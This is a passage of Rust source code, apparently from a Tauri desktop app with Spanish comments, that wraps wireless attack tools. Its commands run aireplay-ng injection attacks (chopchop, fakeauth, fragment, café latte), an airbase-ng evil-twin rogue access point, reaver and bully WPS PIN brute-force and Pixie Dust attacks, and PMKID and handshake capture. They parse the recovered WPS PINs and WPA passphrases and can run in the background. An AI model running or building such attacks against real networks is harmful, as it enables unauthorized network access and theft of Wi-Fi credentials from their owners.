        (Some(p), Some(k)) => format!("✅ WPS PIN: {}\n✅ WPA PSK: {}", p, k),
        (Some(p), None) => format!("✅ WPS PIN: {}", p),
        _ => body.clone(),
    };
    if pin.is_none() { summary = body.clone(); }
    CmdResponse { success: ok || r.success, output: wrap(&format!("WPS PBC · {}", bssid), &summary, ok), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 17 — CHOPCHOP INJECT  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn chopchop_inject(app: AppHandle, target_bssid: String, source_mac: Option<String>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let src_mac   = source_mac.unwrap_or_else(|| "00:11:22:33:44:55".into());
    let out_file = format!("chopchop_{}.xor", target_bssid.replace(':', ""));
    let args = vec!["--chopchop".into(), "-b".into(), target_bssid.clone(), "-h".into(), src_mac.clone(), "-F".into(), out_file.clone(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nMAC origen: {}\nInterface: {}\nSalida: {}\n\n{}", prog.display(), target_bssid, src_mac, iface_in, out_file, r.output);
    let body = with_iface_warn(body, &iface_warn);
    CmdResponse { success: r.success, output: wrap(&format!("ChopChop · {}", target_bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 18 — EVIL TWIN / ROGUE AP  (airbase-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn rogue_ap(app: AppHandle, essid: String, bssid: Option<String>, channel: Option<u8>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRBASE_PATH", "airbase-ng.exe");
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let bssid_val = bssid.unwrap_or_else(|| "00:11:22:33:44:55".into());
    let ch        = channel.unwrap_or(1);
    let args = vec!["--essid".into(), essid.clone(), "-b".into(), bssid_val.clone(), "-c".into(), ch.to_string(), "-W".into(), "2".into(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("airbase-ng.exe"), &args).await;
    let body = format!("Binario: {}\nESSID: {}\nBSSID: {}\nCanal: {}\nInterface: {}\n\n{}", prog.display(), essid, bssid_val, ch, iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    CmdResponse { success: r.success, output: wrap(&format!("Rogue AP \u{00B7} {}", essid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 19 — INJECTION TEST  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn injection_test(app: AppHandle, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let args = vec!["--test".into(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nInterface: {}\n\n{}", prog.display(), iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    let ok = r.output.contains("injection is working") || r.output.contains("Injection is working");
    CmdResponse { success: r.success || ok, output: wrap(&format!("Injection Test · {}", iface_in), &body, ok), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 20 — FAKEAUTH INJECT  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn fakeauth_inject(app: AppHandle, bssid: String, source_mac: Option<String>, delay: Option<u8>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let src_mac = source_mac.unwrap_or_else(|| "00:11:22:33:44:55".into());
    let dly = delay.unwrap_or(1);
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let args = vec!["--fakeauth".into(), dly.to_string(), "-a".into(), bssid.clone(), "-h".into(), src_mac.clone(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nMAC origen: {}\nDelay: {}s\nInterface: {}\n\n{}", prog.display(), bssid, src_mac, dly, iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    CmdResponse { success: r.success, output: wrap(&format!("Fakeauth · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 21 — WPS PIXIE DUST  (reaver-wps -K 1)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn wps_pixiedust(app: AppHandle, bssid: String, iface: Option<String>, channel: Option<u8>) -> CmdResponse {
    let prog = reaver_bin();
    let prog_s = reaver_cmd();
    let iface_in = iface.unwrap_or_else(|| "wlan0".into());
    let ch_warn = pin_channel_best_effort(&iface_in, channel).await;
    let inj = crate::capture::check_injection_capability(iface_in.clone()).await;
    let inj_warn = if inj.supported { None } else {
        Some(format!("⚠️ Inyección no disponible en esta interfaz.\n{}\nSugerencia: usa 'wsl (Kali-WSL2)' en la UI.", inj.message))
    };
    let mut args = vec!["-i".into(), iface_in.clone(), "-b".into(), bssid.clone(), "-K".into(), "1".into(), "-vv".into(), "-L".into()];
    if let Some(ch) = channel { args.push("-c".into()); args.push(ch.to_string()); }
    let r = run_bin(&app, &prog_s, &args).await;
    let pin = parse_wps_pin(&r.output);
    let psk = parse_wpa_psk(&r.output);
    let body = format!("Binario: {}\nBSSID: {}\nInterface: {}\nCanal: {}\nModo: Pixie Dust (-K 1)\n\n{}", prog.display(), bssid, iface_in, channel.map(|c| c.to_string()).unwrap_or("auto".into()), r.output);
    let mut summary = match (&pin, &psk) {
        (Some(p), Some(k)) => format!("OK PIN:{} PSK:{} | {}", p, k, body),
        (Some(p), None) => format!("OK PIN:{} | {}", p, body),
        _ => body.clone(),
    };
    if let Some(w) = ch_warn { summary = format!("{}\n{}", w, summary); }
    if let Some(w) = inj_warn { summary = format!("{}\n{}", w, summary); }
    let ok = pin.is_some();
    CmdResponse { success: ok || r.success, output: wrap(&format!("WPS Pixie Dust · {}", bssid), &summary, ok), stderr: r.stderr, exit_code: r.exit_code }
}

// COMANDO 21b — WASH SCAN (wash.exe: APs con WPS + locked)
#[derive(Debug, Clone, Serialize)]
pub struct WashEntry {
    pub bssid: String,
    pub channel: Option<u8>,
    pub rssi: Option<i32>,
    pub wps_version: String,
    pub wps_locked: bool,
    pub essid: String,
}

fn parse_wash(out: &str) -> Vec<WashEntry> {
    let mut v = vec![];
    for line in out.lines() {
        let t = line.trim();
        if t.is_empty() { continue; }
        let ll = t.to_lowercase();
        if ll.starts_with("bssid") || ll.starts_with("---") || ll.starts_with("wash") { continue; }
        let parts: Vec<&str> = t.split_whitespace().collect();
        if parts.len() < 4 { continue; }
        if parts[0].len() != 17 || !parts[0].contains(':') { continue; }
        let bssid = parts[0].to_uppercase();
        let channel = parts.get(1).and_then(|s| s.parse().ok());
        let rssi = parts.get(2).and_then(|s| s.parse().ok());
        let locked = t.to_lowercase().contains("locked") && !t.to_lowercase().contains("unlocked");
        let essid = if parts.len() > 5 { parts[5..].join(" ") } else { String::new() };
        let wps_version = parts.get(3).unwrap_or(&"").to_string();
        v.push(WashEntry { bssid, channel, rssi, wps_version, wps_locked: locked, essid });
    }
    v
}

#[derive(Debug, Clone, Serialize)]
pub struct WashResult {
    pub success: bool,
    pub output: String,
    pub stderr: String,
    pub exit_code: Option<i32>,
    pub entries: Vec<WashEntry>,
}

#[command]
pub async fn wash_scan(app: AppHandle, iface: Option<String>, channel: Option<u8>) -> WashResult {
    let prog = tool_path("WASH_PATH", "wash.exe");
    let prog_s = prog.to_str().unwrap_or("wash.exe").to_string();
    let iface_in = iface.unwrap_or_else(|| "wlan0".into());
    let ch_warn = pin_channel_best_effort(&iface_in, channel).await;
    let mut args = vec!["-i".into(), iface_in.clone()];
    if let Some(ch) = channel { args.push("-c".into()); args.push(ch.to_string()); }
    let r = run_bin(&app, &prog_s, &args).await;
    let entries = parse_wash(&r.output);
    let mut body = format!("Binario: {}\nInterface: {}\nCanal: {}\nRedes WPS: {}\n\n{}", prog.display(), iface_in, channel.map(|c| c.to_string()).unwrap_or("todos".into()), entries.len(), r.output);
    if let Some(w) = ch_warn { body = format!("{}\n\n{}", w, body); }
    WashResult { success: r.success, output: wrap("Wash Scan WPS", &body, r.success), stderr: r.stderr, exit_code: r.exit_code, entries }
}

// COMANDO 21c — WPS BRUTEFORCE REAVER (ruta por defecto Windows)
#[command]
pub async fn wps_bruteforce_reaver(app: AppHandle, bssid: String, iface: Option<String>, channel: Option<u8>, start_pin: Option<String>, delay_secs: Option<u64>) -> CmdResponse {
    let prog = reaver_bin();
    let prog_s = reaver_cmd();
    let iface_in = iface.unwrap_or_else(|| "wlan0".into());
    let ch_warn = pin_channel_best_effort(&iface_in, channel).await;
    let inj = crate::capture::check_injection_capability(iface_in.clone()).await;
    let inj_warn = if inj.supported { None } else {
        Some(format!("⚠️ Inyección no disponible en esta interfaz.\n{}\nSugerencia: usa 'wsl (Kali-WSL2)' en la UI.", inj.message))
    };
    let mut args = vec!["-i".into(), iface_in.clone(), "-b".into(), bssid.clone(), "-vv".into(), "-L".into()];
    if let Some(ch) = channel { args.push("-c".into()); args.push(ch.to_string()); }
    if let Some(p) = start_pin { let p = p.trim().to_string(); if !p.is_empty() { args.push("-p".into()); args.push(p); } }
    if let Some(d) = delay_secs { args.push("-d".into()); args.push(d.to_string()); }
    let r = run_bin(&app, &prog_s, &args).await;
    let pin = parse_wps_pin(&r.output);
    let psk = parse_wpa_psk(&r.output);
    let body = format!("Binario: {}\nBSSID: {}\nInterface: {}\nCanal: {}\nModo: bruteforce (-vv -L)\n\n{}", prog.display(), bssid, iface_in, channel.map(|c| c.to_string()).unwrap_or("auto".into()), r.output);
    let mut summary = match (&pin, &psk) {
        (Some(p), Some(k)) => format!("OK PIN:{} PSK:{} | {}", p, k, body),
        (Some(p), None) => format!("OK PIN:{} | {}", p, body),
        _ => body.clone(),
    };
    if let Some(w) = ch_warn { summary = format!("{}\n{}", w, summary); }
    if let Some(w) = inj_warn { summary = format!("{}\n{}", w, summary); }
    let ok = pin.is_some();
    CmdResponse { success: ok || r.success, output: wrap(&format!("WPS Bruteforce reaver {}", bssid), &summary, ok), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 22 — CAFÉ LATTE ATTACK  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn cafe_latte_attack(app: AppHandle, bssid: String, client_mac: Option<String>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let mac = client_mac.unwrap_or_else(|| "ff:ff:ff:ff:ff:ff".into());
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let args = vec!["--cafe-latte".into(), "-a".into(), bssid.clone(), "-h".into(), mac.clone(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nMAC cliente: {}\nInterface: {}\n\n{}", prog.display(), bssid, mac, iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    CmdResponse { success: r.success, output: wrap(&format!("Café Latte · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 23 — INTERACTIVE INJECT  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn interactive_inject(app: AppHandle, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let args = vec!["--interactive".into(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nInterface: {}\n\n{}", prog.display(), iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    CmdResponse { success: r.success, output: wrap(&format!("Interactive Inject · {}", iface_in), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 24 — FRAGMENT INJECT  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn fragment_inject(app: AppHandle, bssid: String, source_mac: Option<String>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let src_mac = source_mac.unwrap_or_else(|| "00:11:22:33:44:55".into());
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let args = vec!["--fragment".into(), "-a".into(), bssid.clone(), "-h".into(), src_mac.clone(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nMAC origen: {}\nInterface: {}\n\n{}", prog.display(), bssid, src_mac, iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    CmdResponse { success: r.success, output: wrap(&format!("Fragment Inject · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDOS BACKGROUND + CANCELACIÓN
// ═══════════════════════════════════════════════════════════════════════════════

use crate::AppState;
use tauri::{State, Emitter as _};
use tauri_plugin_shell::process::CommandEvent;

/// Helper: lanza un binario en background y guarda el child en el mapa de ataques
async fn run_bin_bg(app: &AppHandle, state: &State<'_, AppState>, attack_id: &str, exe: &str, args: &[String]) -> CmdResponse {
    if let Err(hint) = require_bin(exe) {
        return CmdResponse {
            success: false, output: String::new(),
            stderr: hint, exit_code: None,
        };
    }
    let shell = app.shell();
    let arg_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
    let (mut rx, child) = match shell.command(exe).args(&arg_refs).spawn() {
        Ok(result) => result,
        Err(e) => return CmdResponse {
            success: false, output: String::new(),
            stderr: e.to_string(), exit_code: None,
        },
    };
    {
        let mut map = state.running_attacks.lock().unwrap();
        map.insert(attack_id.to_string(), child);
    }
    let mut stdout = String::new();
    let mut stderr = String::new();
    let mut exit_code = None;
    while let Some(event) = rx.recv().await {
        match event {
            CommandEvent::Stdout(data) => {
                let txt = String::from_utf8_lossy(&data);
                stdout.push_str(&txt);
                // Emit progress event
                let _ = app.emit("attack-progress", serde_json::json!({
                    "id": attack_id,
                    "type": "stdout",
                    "data": txt.to_string()
                }));
            }
            CommandEvent::Stderr(data) => {
                let txt = String::from_utf8_lossy(&data);
                stderr.push_str(&txt);
                let _ = app.emit("attack-progress", serde_json::json!({
                    "id": attack_id,
                    "type": "stderr",
                    "data": txt.to_string()
                }));
            }
            CommandEvent::Terminated(status) => { exit_code = status.code; break; }
            CommandEvent::Error(err) => {
                stderr.push_str(&format!("Error: {}", err));
                let _ = app.emit("attack-error", serde_json::json!({
                    "id": attack_id,
                    "error": err.to_string()
                }));
                break;
            }
            _ => {}
        }
    }
    {
        let mut map = state.running_attacks.lock().unwrap();
        map.remove(attack_id);
    }
    let success = exit_code == Some(0);
    // Emit final event
    let _ = app.emit("attack-completed", serde_json::json!({
        "id": attack_id,
        "success": success,
        "stdout": stdout.clone(),
        "stderr": stderr.clone(),
        "exit_code": exit_code
    }));
    CmdResponse { success, output: stdout, stderr, exit_code }
}

/// Cancelar un ataque en background por su ID
#[command]
pub async fn cancel_attack(state: State<'_, AppState>, attack_id: String) -> Result<CmdResponse, String> {
    let mut map = state.running_attacks.lock().unwrap();
    if let Some(child) = map.remove(&attack_id) {
        let _ = child.kill();
        Ok(CmdResponse {
            success: true,
            output: format!("Ataque '{}' cancelado.", attack_id),
            stderr: String::new(),
            exit_code: Some(-1),
        })
    } else {
        Ok(CmdResponse {
            success: false,
            output: format!("No se encontró ataque activo con ID '{}'", attack_id),
            stderr: String::new(),
            exit_code: None,
        })
    }
}


/// PMKID Capture en background
#[command]
pub async fn pmkid_capture_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, channel: Option<u8>, duration_seconds: Option<u64>) -> Result<CmdResponse, String> {
    let attack_id = format!("pmkid_{}", bssid.replace(':', ""));
    let prog = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
    let ch = channel.unwrap_or(1);
    let dur = duration_seconds.unwrap_or(120);
    let outfile = format!("capture_{}.pcapng", bssid.replace(':', ""));
    let mut args = vec![
        "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
        "-i".into(), "-t".into(), dur.to_string(),
        "-w".into(), outfile.clone(), "--bssid".into(), bssid.clone(),
    ];
    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
    let r = run_bin_bg(&app, &state, &attack_id, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
    let body = format!("Binario: {}\nArchivo: {}\n\n{}", prog.display(), outfile, r.output);
    Ok(CmdResponse { success: r.success, output: wrap(&format!("PMKID Capture BG · {} · Canal={} · {}s", bssid, ch, dur), &body, r.success), stderr: r.stderr, exit_code: r.exit_code })
}

/// Handshake Capture en background
#[command]
pub async fn capture_handshake_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, essid: Option<String>, channel: Option<u8>, duration_seconds: Option<u64>) -> Result<CmdResponse, String> {
    let attack_id = format!("handshake_{}", bssid.replace(':', ""));
    let dur = duration_seconds.unwrap_or(60);
    let ch = channel.unwrap_or(1);
    let bssid_clean = bssid.replace(':', "");
    let pcap = format!("handshake_{}.pcapng", bssid_clean);
    let hccapx = format!("handshake_{}.hccapx", bssid_clean);
    let mut args = vec![
        "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
        "-i".into(), "-t".into(), dur.to_string(),
        "-w".into(), pcap.clone(), "--bssid".into(), bssid.clone(),
        "--channel".into(), ch.to_string(),
    ];
    if let Some(ref e) = essid { args.push("--essid".into()); args.push(e.clone()); }
    let prog = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
    let cap = run_bin_bg(&app, &state, &attack_id, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
    let conv = if cap.success {
        convert_capture(&app, &pcap, &hccapx).await
    } else { CmdResponse { success: false, output: cap.output.clone(), stderr: cap.stderr.clone(), exit_code: cap.exit_code } };
    let ok = conv.success;
    let body = format!("Paso 1 — Captura:\n{}\n\n{}\n", cap.output, conv.output);
    Ok(CmdResponse { success: ok, output: wrap(&format!("Handshake Capture BG · {} · Canal={} · {}s", bssid, ch, dur), &body, ok), stderr: format!("{}\n{}", cap.stderr, conv.stderr), exit_code: conv.exit_code })
}

/// Scan Airodump en background
#[command]
pub async fn scan_airodump_bg(app: AppHandle, state: State<'_, AppState>, bssid_filter: Option<String>, channel_filter: Option<u8>, duration_secs: Option<u64>, iface: Option<String>) -> Result<CmdResponse, String> {
    let attack_id = "airodump_scan".to_string();
    let prog = tool_path("AIRODUMP_PATH", "airodump-ng.exe");
    let ch = channel_filter.unwrap_or(0);
    let dur = duration_secs.unwrap_or(60);
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let mut args = vec!["--write-interval".into(), "1000".into(), "--output-format".into(), "csv".into()];
    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
    if let Some(ref b) = bssid_filter { args.push("--bssid".into()); args.push(b.clone()); }
    args.push(iface_in.clone());
    let r = run_bin_bg(&app, &state, &attack_id, prog.to_str().unwrap_or("airodump-ng.exe"), &args).await;
    let body = format!("Binario: {}\nCanal: {}  Duración: {}s\nInterface: {}\n\n{}", prog.display(), if ch > 0 { ch.to_string() } else { "todos".into() }, dur, iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    Ok(CmdResponse { success: r.success, output: wrap("AIRODUMP Scan BG", &body, r.success), stderr: r.stderr, exit_code: r.exit_code })
}

/// WPS PIN Bruteforce en background (Opcion C: bully si existe, si no reaver)
#[command]
pub async fn wps_pin_bruteforce_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, interface: String, channel: Option<u8>) -> Result<CmdResponse, String> {
    let attack_id = format!("wps_{}", bssid.replace(':', ""));
    let ch_warn = pin_channel_best_effort(&interface, channel).await;
    if has_bully() {
        let prog = bully_bin();
        let prog_s = prog.to_str().unwrap_or("bully.exe").to_string();
        let args = vec!["-b".into(), bssid.clone(), interface.clone()];
        let r = run_bin_bg(&app, &state, &attack_id, &prog_s, &args).await;
        let pin = parse_wps_pin(&r.output);
        let summary = match pin {
            Some(p) => format!("OK PIN:{} | {}", p, r.output.lines().filter(|l| l.to_lowercase().contains("pin:")).collect::<Vec<_>>().join("\n")),
            None => format!("bully BG ejecutado. {}", r.output.lines().take(20).collect::<Vec<_>>().join("\n")),
        };
        let summary = with_opt_warn(summary, &ch_warn);
        return Ok(CmdResponse { success: r.success, output: wrap(&format!("WPS Bruteforce BG bully {} {}", bssid, interface), &summary, r.success), stderr: r.stderr, exit_code: r.exit_code });
    }
    let prog_s = reaver_cmd();
    let inj = crate::capture::check_injection_capability(interface.clone()).await;
    let inj_warn = if inj.supported { None } else {
        Some(format!("⚠️ Inyección no disponible en esta interfaz.\n{}\nSugerencia: usa 'wsl (Kali-WSL2)' en la UI.", inj.message))
    };
    let mut args = vec!["-i".into(), interface.clone(), "-b".into(), bssid.clone(), "-vv".into(), "-L".into()];
    if let Some(ch) = channel { args.push("-c".into()); args.push(ch.to_string()); }
    let r = run_bin_bg(&app, &state, &attack_id, &prog_s, &args).await;
    let pin = parse_wps_pin(&r.output);
    let mut summary = match pin {
        Some(p) => format!("OK PIN:{} (reaver fallback BG) | {}", p, r.output.lines().take(20).collect::<Vec<_>>().join("\n")),
        None => "reaver BG ejecutado (bully.exe no encontrado, fallback).".into(),
    };
    summary = with_opt_warn(summary, &ch_warn);
    summary = with_opt_warn(summary, &inj_warn);
    Ok(CmdResponse { success: r.success, output: wrap(&format!("WPS Bruteforce BG reaver {} {}", bssid, interface), &summary, r.success), stderr: r.stderr, exit_code: r.exit_code })
}

/// WPS bruteforce reaver en background (ruta por defecto Windows)
#[command]
pub async fn wps_bruteforce_reaver_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, iface: Option<String>, channel: Option<u8>) -> Result<CmdResponse, String> {
    let attack_id = format!("wpsr_{}", bssid.replace(':', ""));
    let iface_in = iface.unwrap_or_else(|| "wlan0".into());
    let prog_s = reaver_cmd();
    let ch_warn = pin_channel_best_effort(&iface_in, channel).await;
    let inj = crate::capture::check_injection_capability(iface_in.clone()).await;
    let inj_warn = if inj.supported { None } else {
        Some(format!("⚠️ Inyección no disponible en esta interfaz.\n{}\nSugerencia: usa la opción 'wsl (Kali-WSL2)' en la UI para ejecutar reaver en Kali.", inj.message))
    };
    let mut args = vec!["-i".into(), iface_in.clone(), "-b".into(), bssid.clone(), "-vv".into(), "-L".into()];
    if let Some(ch) = channel { args.push("-c".into()); args.push(ch.to_string()); }
    let r = run_bin_bg(&app, &state, &attack_id, &prog_s, &args).await;
    let mut out = with_opt_warn(r.output, &ch_warn);
    out = with_opt_warn(out, &inj_warn);
    Ok(CmdResponse { success: r.success, output: wrap(&format!("WPS reaver BG {}", bssid), &out, r.success), stderr: r.stderr, exit_code: r.exit_code })
}

/// Wash scan en background
#[command]
pub async fn wash_scan_bg(app: AppHandle, state: State<'_, AppState>, iface: Option<String>, channel: Option<u8>) -> Result<CmdResponse, String> {
    let attack_id = "wash_scan".to_string();
    let iface_in = iface.unwrap_or_else(|| "wlan0".into());
    let prog = tool_path("WASH_PATH", "wash.exe");
    let prog_s = prog.to_str().unwrap_or("wash.exe").to_string();
    let ch_warn = pin_channel_best_effort(&iface_in, channel).await;
    let mut args = vec!["-i".into(), iface_in.clone()];
    if let Some(ch) = channel { args.push("-c".into()); args.push(ch.to_string()); }
    let r = run_bin_bg(&app, &state, &attack_id, &prog_s, &args).await;
    let entries = parse_wash(&r.output);
    let body = format!("Redes WPS: {}\n\n{}", entries.len(), r.output);
    let body = with_opt_warn(body, &ch_warn);
    Ok(CmdResponse { success: r.success, output: wrap("Wash Scan BG", &body, r.success), stderr: r.stderr, exit_code: r.exit_code })
}

/// WPS PBC en background (reaver.exe -S)
#[command]
pub async fn wps_pbc_attack_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, iface: Option<String>, channel: Option<u8>) -> Result<CmdResponse, String> {
    let attack_id = format!("wpspbc_{}", bssid.replace(':', ""));
    let iface_in = iface.unwrap_or_else(|| "wlan0".into());
    let prog_s = reaver_cmd();
    let ch_warn = pin_channel_best_effort(&iface_in, channel).await;
    let inj = crate::capture::check_injection_capability(iface_in.clone()).await;
    let inj_warn = if inj.supported { None } else {
        Some(format!("⚠️ Inyección no disponible en esta interfaz.\n{}\nSugerencia: usa 'wsl (Kali-WSL2)' en la UI.", inj.message))
    };
    let mut args = vec!["-i".into(), iface_in.clone(), "-b".into(), bssid.clone(), "-S".into(), "-vv".into(), "-L".into()];
    if let Some(ch) = channel { args.push("-c".into()); args.push(ch.to_string()); }
    let r = run_bin_bg(&app, &state, &attack_id, &prog_s, &args).await;
    let pin = parse_wps_pin(&r.output);
    let mut summary = match pin {
        Some(p) => format!("OK PIN:{} | {}", p, r.output.lines().take(20).collect::<Vec<_>>().join("\n")),
        None => format!("PBC BG ejecutado. {}", r.output.lines().take(20).collect::<Vec<_>>().join("\n")),
    };
    summary = with_opt_warn(summary, &ch_warn);
    summary = with_opt_warn(summary, &inj_warn);
    Ok(CmdResponse { success: r.success, output: wrap(&format!("WPS PBC BG {}", bssid), &summary, r.success), stderr: r.stderr, exit_code: r.exit_code })
}

/// WPS Pixie Dust en background (reaver.exe -K 1)
#[command]
pub async fn wps_pixiedust_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, iface: Option<String>, channel: Option<u8>) -> Result<CmdResponse, String> {
    let attack_id = format!("wpspix_{}", bssid.replace(':', ""));
    let iface_in = iface.unwrap_or_else(|| "wlan0".into());
    let prog_s = reaver_cmd();
    let ch_warn = pin_channel_best_effort(&iface_in, channel).await;
    let inj = crate::capture::check_injection_capability(iface_in.clone()).await;
    let inj_warn = if inj.supported { None } else {
        Some(format!("⚠️ Inyección no disponible en esta interfaz.\n{}\nSugerencia: usa 'wsl (Kali-WSL2)' en la UI.", inj.message))
    };
    let mut args = vec!["-i".into(), iface_in.clone(), "-b".into(), bssid.clone(), "-K".into(), "1".into(), "-vv".into(), "-L".into()];
    if let Some(ch) = channel { args.push("-c".into()); args.push(ch.to_string()); }
    let r = run_bin_bg(&app, &state, &attack_id, &prog_s, &args).await;
    let pin = parse_wps_pin(&r.output);
    let mut summary = match pin {
        Some(p) => format!("OK PIN:{} | {}", p, r.output.lines().take(20).collect::<Vec<_>>().join("\n")),
        None => format!("Pixie BG ejecutado. {}", r.output.lines().take(20).collect::<Vec<_>>().join("\n")),
    };
    summary = with_opt_warn(summary, &ch_warn);
    summary = with_opt_warn(summary, &inj_warn);
    Ok(CmdResponse { success: r.success, output: wrap(&format!("WPS Pixie BG {}", bssid), &summary, r.success), stderr: r.stderr, exit_code: r.exit_code })
}


